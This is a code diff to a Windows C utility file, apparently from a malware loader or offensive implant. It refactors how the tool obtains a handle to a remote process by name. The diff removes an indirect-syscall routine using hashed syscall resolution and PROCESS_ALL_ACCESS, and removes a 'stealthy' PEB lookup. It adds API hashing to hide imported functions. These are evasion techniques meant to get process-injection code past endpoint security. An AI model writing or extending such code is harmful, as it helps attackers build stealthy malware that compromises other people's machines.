@@ -1,19 +1,22 @@
 #include "utils.h"
-#include <tlhelp32.h>
 
-#ifndef STATUS_INFO_LENGTH_MISMATCH
-#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+
+BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+#ifdef SYSCALL_ENABLED
+    return GetRemoteProcessHandleSyscall(szProcessName, dwProcessId, hProcess);
+#else
+    return GetRemoteProcessHandleWinAPI(szProcessName, dwProcessId, hProcess);
 #endif
-
+}
 
 // Gets the process handle of a process of name szProcessName
-BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+BOOL GetRemoteProcessHandleWinAPI(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
 	HANDLE			hSnapShot		= NULL;
 	PROCESSENTRY32W	Proc			= { .dwSize = sizeof(PROCESSENTRY32W) };
 
 	// Takes a snapshot of the currently running processes
 
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	hSnapShot = (HANDLE)CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
 	if (hSnapShot == INVALID_HANDLE_VALUE){
 		DebugPrint("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
@@ -86,114 +89,6 @@ _EndOfFunction:
 }
 
 
-BOOL syscall_GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
-	DebugPrint("[i] Using indirect syscall version of GetRemoteProcessHandle.\n");
-    HANDLE hSnapShot = NULL;
-    PROCESSENTRY32W	Proc = { .dwSize = sizeof(PROCESSENTRY32W) };
-
-    NtQuerySystemInformation_t pNtQuerySystemInformation = (NtQuerySystemInformation_t)PrepareSyscallHash(NtQuerySystemInformation_JOAA);
-
-    if (!pNtQuerySystemInformation) {
-        DebugPrint("[-] Failed to prepare syscall for NtQuerySystemInformation.\n");
-        return FALSE;
-    }
-
-    ULONG bufferSize = 0;
-    PVOID pProcessInfo = NULL;
-    NTSTATUS status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, 0, &bufferSize);
-
-    if (status != STATUS_INFO_LENGTH_MISMATCH) {
-        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
-        return FALSE;
-    }
-
-	NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)PrepareSyscallHash(NtAllocateVirtualMemory_JOAA);
-    
-    if (!pNtAllocateVirtualMemory) {
-        DebugPrint("[-] Failed to prepare syscall for NtAllocateVirtualMemory.\n");
-        return FALSE;
-    }
-
-    SIZE_T regionSize = bufferSize;
-    status = pNtAllocateVirtualMemory(
-        GetCurrentProcess(),
-        &pProcessInfo,
-        0,
-        &regionSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE
-    );
-	if (!NT_SUCCESS(status)) {
-        DebugPrint("[-] NtAllocateVirtualMemory failed: 0x%X\n", status);
-        return FALSE;
-    }
-
-    status = pNtQuerySystemInformation(SystemProcessInformation, pProcessInfo, bufferSize, &bufferSize);
-    if (!NT_SUCCESS(status)) {
-        DebugPrint("[-] NtQuerySystemInformation failed: 0x%X\n", status);
-        HeapFree(GetProcessHeap(), 0, pProcessInfo);
-        return FALSE;
-    }
-
-    PSYSTEM_PROCESS_INFORMATION pCurrent = (PSYSTEM_PROCESS_INFORMATION)pProcessInfo;
-    while (pCurrent) {
-        if (pCurrent->ImageName.Buffer && _wcsicmp(pCurrent->ImageName.Buffer, szProcessName) == 0) {
-            *dwProcessId = (DWORD)(ULONG_PTR)pCurrent->UniqueProcessId;
-            break;
-        }
-        pCurrent = (pCurrent->NextEntryOffset) ? (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)pCurrent + pCurrent->NextEntryOffset) : NULL;
-    }
-
-    if (dwProcessId == NULL || *dwProcessId == 0) {
-        DebugPrint("[-] Process not found.\n");
-        goto _EndOfFunction;
-    }
-
-    NtOpenProcess_t pNtOpenProcess = (NtOpenProcess_t)PrepareSyscallHash(NtOpenProcess_JOAA);
-
-    if (!pNtOpenProcess) {
-        DebugPrint("[-] Failed to prepare syscall for NtOpenProcess.\n");
-        return FALSE;
-    }
-
-    OBJECT_ATTRIBUTES ObjectAttributes;
-    CLIENT_ID ClientId;
-    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
-    ClientId.UniqueProcessId = (HANDLE)(ULONG_PTR)*dwProcessId;
-    ClientId.UniqueThreadId = NULL;
-
-    status = pNtOpenProcess(hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
-
-    if (!NT_SUCCESS(status)) {
-        DebugPrint("[!] NtOpenProcess Failed With Error: 0x%X \n", status);
-        return FALSE;
-    }
-
-_EndOfFunction:
-    if (pProcessInfo) {
-        NtFreeVirtualMemory_t pNtFreeVirtualMemory = (NtFreeVirtualMemory_t)PrepareSyscallHash(NtFreeVirtualMemory_JOAA);
-        if (!pNtFreeVirtualMemory) {
-            DebugPrint("[-] Failed to prepare syscall for NtFreeVirtualMemory.\n");
-            return FALSE;
-        }
-
-        NTSTATUS status = pNtFreeVirtualMemory(
-            GetCurrentProcess(),  // Using the current process handle
-            &pProcessInfo,        // Pointer to the base address of the allocated memory
-            &regionSize,          // Size of the allocated memory
-            MEM_RELEASE           // Indicate we want to fully release the memory
-        );
-        if (!NT_SUCCESS(status)) {
-            DebugPrint("[-] NtFreeVirtualMemory failed: 0x%X\n", status);
-            return FALSE;
-        }
-
-	}
-    
-    return (*dwProcessId != NULL && *hProcess != NULL);
-}
-
-
 BOOL GetFunctionAddressInRemoteProcess(HANDLE hProcess, LPCSTR lpFunctionName, LPCSTR lpModuleName, PVOID* pFunctionAddress) {
 	HMODULE hModules[1024];
 	DWORD cbNeeded;
@@ -205,8 +100,8 @@ BOOL GetFunctionAddressInRemoteProcess(HANDLE hProcess, LPCSTR lpFunctionName, L
         DebugPrint("Failed to load psapi.dll. Error: %ld\n", GetLastError());
         return 0;
     }
-    EnumProcessModulesEx_t pEnumProcessModulesEx = (EnumProcessModulesEx_t)GetProcAddress(hPsapi, "EnumProcessModulesEx");
-    GetModuleBaseNameA_t pGetModuleBaseNameA = (GetModuleBaseNameA_t)GetProcAddress(hPsapi, "GetModuleBaseNameA");
+    EnumProcessModulesEx_t pEnumProcessModulesEx = (EnumProcessModulesEx_t)GetProcAddressH(hPsapi, EnumProcessModulesEx_JOAA);
+    GetModuleBaseNameA_t pGetModuleBaseNameA = (GetModuleBaseNameA_t)GetProcAddressH(hPsapi, GetModuleBaseNameA_JOAA);
 
 	if (pEnumProcessModulesEx(hProcess, hModules, sizeof(hModules), &cbNeeded, LIST_MODULES_ALL)) {
 		for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
@@ -227,23 +122,6 @@ BOOL GetFunctionAddressInRemoteProcess(HANDLE hProcess, LPCSTR lpFunctionName, L
 	}
 	return FALSE;
 }
-
-
-#ifdef _WIN64
-PPEB GetPEBStealthy() {
-    void* pTeb = (void*)__readgsqword(0x30); // TEB base for x64
-    return *(PPEB*)((unsigned char*)pTeb + 0x60); // Offset to PEB
-}
-#elif _WIN32
-PPEB GetPEBStealthy() {
-    void* pTeb;
-    __asm {
-        mov eax, fs:[0x18]  // TEB base for x86
-        mov pTeb, eax
-    }
-    return *(PPEB*)((unsigned char*)pTeb + 0x30); // Offset to PEB
-}
-#endif
 
 BOOL IsHandleValid(HANDLE h) {
     DWORD flags = 0;
